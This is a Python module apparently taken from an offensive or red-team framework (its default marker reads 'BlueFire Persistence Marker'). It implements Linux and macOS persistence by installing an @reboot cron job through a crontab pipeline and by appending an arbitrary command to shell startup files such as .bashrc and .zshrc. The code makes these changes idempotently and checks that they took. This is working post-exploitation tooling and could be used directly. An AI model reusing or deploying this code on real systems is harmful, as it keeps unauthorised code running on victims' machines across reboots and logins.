import os
import platform
import subprocess
import shlex # Import shlex for robust shell argument quoting
from typing import Dict, Any, Tuple, Optional, List
import logging
from pathlib import Path # Use pathlib for cleaner path handling

# Assume logger is passed or configured appropriately
logger = logging.getLogger(__name__)

class LinuxPersistence:
    """Handles Linux-specific persistence techniques."""

    def __init__(self, execute_command_func):
        """
        Initialize LinuxPersistence.

        Args:
            execute_command_func: A callable provided by the main Persistence class
                                  to execute commands.
        """
        self._execute_command = execute_command_func
        self.handler_map = {
            "cron_job": self._handle_cron_job,
            "profile_script": self._handle_profile_script,
            # Add other Linux techniques here (e.g., systemd, bashrc)
        }

    def establish(self, technique: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using a specific Linux technique."""
        handler = self.handler_map.get(technique)
        if handler:
            logger.info(f"Executing Linux persistence technique: {technique}")
            try:
                return handler(details)
            except Exception as e:
                logger.error(f"Error executing Linux persistence technique '{technique}': {e}", exc_info=True)
                return {"status": "failure", "technique": technique, "reason": str(e)}
        else:
            logger.warning(f"Unsupported Linux persistence technique requested: {technique}")
            return {"status": "failure", "technique": technique, "reason": "Unsupported technique for Linux/macOS"}

    # --- Technique Handlers ---

    def _handle_cron_job(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using cron jobs (Linux/macOS)."""
        command = details.get("command")
        schedule = details.get("schedule", "@reboot") # e.g., @reboot, @hourly, */5 * * * *
        comment = details.get("comment") # Optional comment for identification

        if not command:
            return {"status": "failure", "technique": "cron_job", "reason": "Missing 'command' in details."}

        logger.info(f"Attempting to add cron job with schedule: {schedule}")
        logger.debug(f"Cron Command: {command}")

        cron_line = f"{schedule} {command}"
        if comment:
            # Add comment before the cron line
            cron_line = f"# {comment}\n{cron_line}"

        # Use the comment as the unique marker if present, otherwise the schedule+command
        check_marker = f"# {comment}" if comment else f"{schedule} {command}"

        # Quote the marker and the full line safely for shell embedding
        quoted_check_marker = shlex.quote(check_marker)
        quoted_cron_line = shlex.quote(cron_line)

        # Construct the command using safer quoting
        # Check if the marker exists. If not (||), add the new line.
        # Use `echo -e` with the quoted string, which the shell will unquote.
        add_cron_cmd = (
            f"crontab -l 2>/dev/null | grep -Fxq {quoted_check_marker} || "
            f"( (crontab -l 2>/dev/null ; echo -e {quoted_cron_line}) | crontab - )"
        )

        status = "failure"
        output = ""
        error = ""
        verification_passed = False

        try:
            logger.debug(f"Executing command: {add_cron_cmd}")
            # Execute the command to add the cron job
            exec_result_add = self._execute_command(add_cron_cmd, capture_output=True)

            if exec_result_add.get('return_code') == 0:
                logger.info("Cron job addition command executed successfully.")
                # Verify using the same quoted marker
                verify_cmd = f"crontab -l | grep -Fxq {quoted_check_marker}"
                logger.debug(f"Verifying cron job with command: {verify_cmd}")
                exec_result_verify = self._execute_command(verify_cmd, capture_output=True)

                if exec_result_verify.get('return_code') == 0:
                    logger.info(f"Cron job verified successfully in crontab.")
                    status = "success"
                    verification_passed = True
                else:
                    reason = "Cron job add command succeeded, but verification failed. Job might not be present."
                    logger.error(reason)
                    error = reason
            else:
                output = exec_result_add.get('output', '')
                error = exec_result_add.get('error', '')
                reason = f"Failed to execute cron job addition command. RC: {exec_result_add.get('return_code')}. Error: {error or output}"
                logger.error(reason)
                error = reason # Assign to error for reporting

        except Exception as e:
            logger.error(f"Exception adding cron job: {e}", exc_info=True)
            error = str(e)

        return {
            "status": status,
            "technique": "cron_job",
            "schedule": schedule,
            "command": command,
            "comment": comment,
            "verification_passed": verification_passed,
            "reason": error if status == "failure" else None
        }

    def _find_profile_scripts(self) -> List[Path]:
        """Find common user profile scripts that exist."""
        home_dir = Path.home()
        common_scripts = [
            ".bashrc",
            ".bash_profile",
            ".zshrc",
            ".zprofile",
            ".profile" # Often sourced by others
        ]
        existing_scripts = []
        for script_name in common_scripts:
            script_path = home_dir / script_name
            if script_path.is_file():
                logger.debug(f"Found profile script: {script_path}")
                existing_scripts.append(script_path)
            else:
                 logger.debug(f"Profile script not found: {script_path}")
        # Add logic here to potentially detect default shell and prioritize its script?
        # e.g., using `os.environ.get('SHELL')`
        return existing_scripts

    def _handle_profile_script(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence by adding a command to user profile scripts (e.g., .bashrc)."""
        # Parameters:
        # - command: The shell command line to add.
        # - comment: An optional comment to add above the command for identification/idempotency.
        # - target_scripts: Optional list of specific script filenames (e.g., [".bashrc"]) to target.
        #                   If None, attempts to find and modify common ones.

        command = details.get("command")
        comment = details.get("comment", f"BlueFire Persistence Marker") # Default comment for idempotency
        target_scripts_names = details.get("target_scripts") # Optional specific list

        if not command:
            return {"status": "failure", "technique": "profile_script", "reason": "Missing 'command' in details."}

        logger.info(f"Attempting to add command to profile script(s). Comment: '{comment}'")
        logger.debug(f"Profile Script Command: {command}")

        line_to_add = f"\n# --- {comment} ---\n{command}\n# --- End {comment} ---"
        check_marker = f"# --- {comment} ---" # Use the comment start as the idempotency check

        # Determine which scripts to modify
        scripts_to_modify: List[Path] = []
        if target_scripts_names:
            home_dir = Path.home()
            for name in target_scripts_names:
                 script_path = home_dir / name
                 if script_path.is_file():
                      scripts_to_modify.append(script_path)
                 else:
                      logger.warning(f"Specified target script '{name}' not found at {script_path}. Skipping.")
        else:
            scripts_to_modify = self._find_profile_scripts()

        if not scripts_to_modify:
             return {"status": "failure", "technique": "profile_script", "reason": "No suitable profile scripts found to modify."}

        overall_status = "failure" # Assume failure until at least one succeeds
        modified_files = []
        failed_files = {}

        for script_path in scripts_to_modify:
             logger.debug(f"Processing script: {script_path}")
             status = "failure"
             reason = ""
             try:
                  # Check if marker already exists
                  script_content = script_path.read_text(encoding='utf-8', errors='ignore')
                  if check_marker in script_content:
                       reason = f"Marker '{comment}' already found in {script_path}. Skipping modification."
                       logger.info(reason)
                       # Consider this a success for idempotency?
                       # Let's treat it as skipped, overall success depends on other files.
                       continue # Skip to next file

                  # Append the line
                  with script_path.open("a", encoding='utf-8') as f:
                       f.write(line_to_add)

                  # Basic verification (re-read and check)
                  script_content_after = script_path.read_text(encoding='utf-8', errors='ignore')
                  if check_marker in script_content_after:
                       logger.info(f"Successfully appended command to {script_path}")
                       status = "success"
                       modified_files.append(str(script_path))
                       overall_status = "success" # Mark overall success if any file is modified
                  else:
                       reason = f"Command appended to {script_path}, but verification marker '{check_marker}' not found afterwards."
                       logger.error(reason)
                       failed_files[str(script_path)] = reason

             except PermissionError as e:
                  reason = f"Permission denied accessing/modifying {script_path}: {e}"
                  logger.error(reason)
                  failed_files[str(script_path)] = reason
             except Exception as e:
                  reason = f"Unexpected error processing {script_path}: {e}"
                  logger.error(reason, exc_info=True)
                  failed_files[str(script_path)] = reason

        return {
            "status": overall_status,
            "technique": "profile_script",
            "command": command,
            "comment_marker": comment,
            "modified_scripts": modified_files,
            "failed_scripts": failed_files, # Dictionary of path: reason
            "reason": f"{len(failed_files)} script(s) failed modification." if failed_files else None
        }

    # Add other Linux/macOS specific methods like _handle_systemd_unit, _handle_bashrc etc. here 